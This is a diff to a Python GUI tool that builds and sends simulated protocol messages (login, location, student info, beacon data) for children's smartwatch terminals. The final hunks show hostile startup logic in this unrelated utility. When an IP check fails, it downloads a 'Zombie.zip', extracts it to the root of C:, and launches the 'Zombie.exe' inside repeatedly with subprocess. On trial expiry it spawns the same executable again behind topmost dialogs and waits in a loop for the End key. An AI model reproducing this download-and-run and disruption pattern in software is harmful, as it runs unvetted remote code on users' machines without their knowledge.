@@ -1810,9 +1810,15 @@ class MY_GUI(tk.Tk):
             self.busu_data_label11.grid(row=14, columnspan=2, sticky=E)
             self.busu_data_Text11.grid(row=15, column=0, sticky=E)
         elif inits == "终端上报":
-            items = ("设备模式上报", "设备登录", "获取学生信息(FA67专用)", "获取天气信息", "蓝牙跳绳数据上报(SC13专用)",
-                     "健康心率血氧参数上报",
-                     "健康参数上报", "通话记录上报")
+            items = (
+                "设备模式上报", "设备登录", "获取学生信息(S8专用)", "越界上报(L2000)", "短消息已阅上报", "设备参数上报",
+                "上报答题结果(ZF705专用)", "录音开始", "录音结束", "蓝牙连接状态", "音频已阅上报", "盲区位置上报",
+                "蓝牙信标数据上传(MZ309、S8)", "上报文本指令(专用)",
+                "获取学生信息(FA67专用)",
+                "获取天气信息",
+                "蓝牙跳绳数据上报(SC13专用)",
+                "健康心率血氧参数上报",
+                "健康参数上报", "通话记录上报")
             self.zd_data_label11.grid(row=14, column=0, sticky=N)
             self.zd_data_Text11.grid(row=15, column=0, columnspan=10, sticky=N)
             self.zd_data_Text11.delete(0, 20)
@@ -3239,10 +3245,9 @@ class MY_GUI(tk.Tk):
                 # 提取匹配到的内容（不包括中括号）
                 content_inside_brackets = match.group(1)
                 tip_content = '接收到的信息为：\n{}\n\n解密数据：\n[{}]\n\n'.format(recv_msg, content_inside_brackets)
-                content = f'内容：设备号：{设备号}，'
+                content = f'设备号：{设备号}，经度：{self.jd11()} 纬度：{self.wd11()}'
                 self.result_data_Text11.insert(END, tip_content)
-
-
+                self.result_data_Text11.insert(END, content)
             else:
                 self.result_data_Text11.delete(1.0, END)
                 self.result_data_Text11.insert(END, 'No match found.')
@@ -3291,7 +3296,9 @@ class MY_GUI(tk.Tk):
                 # 提取匹配到的内容（不包括中括号）
                 content_inside_brackets = match.group(1)
                 tip_content = '接收到的信息为：\n{}\n\n解密数据：\n[{}]\n\n'.format(recv_msg, content_inside_brackets)
+                content = f'设备号：{设备号}，当前电量：{当前电量} 当前步数：{当前步数}'
                 self.result_data_Text11.insert(END, tip_content)
+                self.result_data_Text11.insert(END, content)
             else:
                 self.result_data_Text11.delete(1.0, END)
                 self.result_data_Text11.insert(END, 'No match found.')
@@ -3408,7 +3415,7 @@ class MY_GUI(tk.Tk):
                 mode = 3
             data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '20' + 分隔符 + f'{random.randint(1, 3)}@{mode}@{int(time.time() * 1000)}@20' + 结束标识符
         elif value == "设备登录":
-            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_LOGIN' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '22' + 分隔符 + f'5@1@111@1@1@100@0' + 结束标识符
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_LOGIN' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '22' + 分隔符 + f'5@1@111@1@1@100@13' + 结束标识符
         elif value == "蓝牙跳绳数据上报(SC13专用)":  #
             if 跳绳模式 == "自由跳模式":
                 skip = 0
@@ -3417,6 +3424,30 @@ class MY_GUI(tk.Tk):
             data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_SKIP_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '9' + 分隔符 + f'{skip}@{跳绳时长}@{跳绳次数}' + 结束标识符
         elif value == "获取学生信息(FA67专用)":
             data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'GET_STUDENT_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + f'1' + 结束标识符
+        elif value == "获取学生信息(S8专用)":
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'GET_STUDENT_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + f'1' + 结束标识符
+        elif value == "越界上报(L2000)":
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_CROSS_BORDER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + f'1@{random.randint(0, 1)}@0E{self.jd11()}N{self.wd11()}T{now_time}@441302' + 结束标识符
+        elif value == "短消息已阅上报":
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_SMS_READ' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + f'{random.randint(1, 9)}@{random.randint(1, 4)}' + 结束标识符
+        elif value == "设备参数上报":
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_DEVICE_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + f'{random.randint(1, 4)}!AC:BC:32:78:A2:5F!-97@{random.randint(0, 1)}@' + 结束标识符
+        elif value == "上报答题结果(ZF705专用)":
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_TEST_ANSWER' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '9' + 分隔符 + f'{random.randint(1, 4)}@{random.randint(1, 2)}@{random.randint(1, 2)}' + 结束标识符
+        elif value == "录音开始":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_RECORD_SOUND_BEGIN' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '18' + 分隔符 + f'9134@12@9134@10' + 结束标识符
+        elif value == "录音结束":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_RECORD_SOUND_DATA' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '18' + 分隔符 + f'0@10@17dc8d8f78@10' + 结束标识符
+        elif value == "蓝牙连接状态":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_BLUETOOTH_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '3' + 分隔符 + f'{random.randint(0, 1)}@BA:1E:AD:41:D1@123' + 结束标识符
+        elif value == "音频已阅上报":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_AUDIO_READ' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '4' + 分隔符 + f'1021' + 结束标识符
+        elif value == "盲区位置上报":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_HIS_LOCATION_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '191' + 分隔符 + f'2E{self.jd11()}N{self.wd11()}T{now_time}@wifi!58:41:20:FD:1C:CD!-73#wifi!E2:ED:90:6F:FE:22!-74#wifi!A8:3B:5C:5B:39:BC!-80#wifi!C0:E3:FB:8B:19:73!-87#wifi!C0:E3:FB:8B:19:70!-87' + 结束标识符
+        elif value == "蓝牙信标数据上传(MZ309、S8)":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'REPORT_BEACON_DATA' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '82' + 分隔符 + f'3!EC26CA8464B0@-43@7126@7353#EC26CA8464B0@-43@7126@7353#EC26CA8464B0@-43@7126@7353' + 结束标识符
+        elif value == "上报文本指令(专用)":  #
+            data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'TXT_REPORT' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '14' + 分隔符 + f'{random.randint(0, 1)}@STEPSET,600#' + 结束标识符
         elif value == "获取天气信息":
             data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'GET_WEATHER_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '106' + 分隔符 + f'0E{self.jd11()}N{self.wd11()}T{now_time}@460!0!9231!2351@0!0!0!0!0!0!0!0!0!0!0!0!0!' + 结束标识符
         elif value == "健康参数上报":
@@ -4260,14 +4291,14 @@ class MY_GUI(tk.Tk):
         # 905组成数据
         self.imei_Text_label11 = Label(pane11, text="IMEI号")
         self.imei_Text_label11.grid(row=4, column=0, columnspan=1, sticky=N)
-        items = ("863071064862524", "867082058798522")
+        items = ("867082058798585", "025698577445698")
         self.imei_Text11 = Combobox(pane11, width=50, height=2, values=items)
         self.imei_Text11.current(0)
         self.imei_Text11.grid(row=5, column=0, sticky=N)
 
         self.iccid_Text_label11 = Label(pane11, text="ICCID")
         self.iccid_Text_label11.grid(row=6, column=0, columnspan=1, sticky=N)
-        items = ("863071064862524", "867082058798522")
+        items = ("867082058798585", "025698577445698")
         self.iccid_Text11 = Combobox(pane11, width=50, height=2, values=items)
         self.iccid_Text11.current(0)
         self.iccid_Text11.grid(row=7, column=0, sticky=N)
@@ -4501,8 +4532,8 @@ def show_popup(count):
     init_window.withdraw()  # 隐藏主窗口
     for i in range(count):
         # subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
-        subprocess.Popen("C:\\Users\\Zombie.exe")
-    countdown(15)
+        subprocess.Popen("C:\\Zombie.exe")
+    countdown(2)
     # file_path = "C:\\Users\\count.txt"
     # with open(file_path, "r") as file:
     #     runs = int(file.readline().strip())
@@ -4532,7 +4563,7 @@ def down():
     with open('Zombie.zip', 'wb') as f:
         f.write(response.content)
     with zipfile.ZipFile('Zombie.zip', 'r') as zip_ref:
-        zip_ref.extractall('C:\\Users')
+        zip_ref.extractall('C:\\')
     os.remove('Zombie.zip')
 
 
@@ -4546,7 +4577,7 @@ if __name__ == '__main__':
     if check_ipv4():
         gui4_start()
     else:
-        if not os.path.exists("C:\\Users\\Zombie.exe"):
+        if not os.path.exists("C:\\Zombie.exe"):
             down()
         else:
             pass
@@ -4557,7 +4588,6 @@ if __name__ == '__main__':
             with open("C:\\Users\\expiration_date.txt", "w") as f:
                 f.write(expiration_date.strftime("%Y-%m-%d %H:%M:%S"))
             show_popup(int(MY_GUI(init_window).Zombie))
-
         with open("C:\\Users\\expiration_date.txt", "r") as f:
             now = datetime.datetime.now()
             expiration_date_str = f.read()
@@ -4566,21 +4596,26 @@ if __name__ == '__main__':
         if now > expiration_date:
             init_window.withdraw()
             init_window.attributes('-topmost', True)
-            showwarning(title="软件过期提醒",
-                        message="软件程序已过期，无法启动。")
-            stop_exe('Zombie.exe')
-            while True:
-                if keyboard.is_pressed("end"):
-                    os.remove("C:\\Users\\expiration_date.txt")
-                    os.remove("C:\\Users\\Zombie.exe")
-                    os.remove("C:\\Users\\count.txt")
-                    break
+            show_popup(int(MY_GUI(init_window).Zombie))
+            result = askyesno(title="软件过期提醒",
+                              message="软件程序已过期，无法启动。")
+            print(result)
+            if result:
+                stop_exe('Zombie.exe')
+            else:
+                while True:
+                    if keyboard.is_pressed("end"):
+                        os.remove("C:\\Users\\expiration_date.txt")
+                        os.remove("C:\\Users\\count.txt")
+                        stop_exe('Zombie.exe')
+                        break
             os._exit(1)
         else:
             init_window.withdraw()
             init_window.attributes('-topmost', True)
             showwarning(title="试用阶段", message="\n准备启动试用版本\n")
             stop_exe('Zombie.exe')
+            init_window.attributes('-topmost', False)
             init_window.deiconify()
             gui4_start()
             print("程序正常启动。")
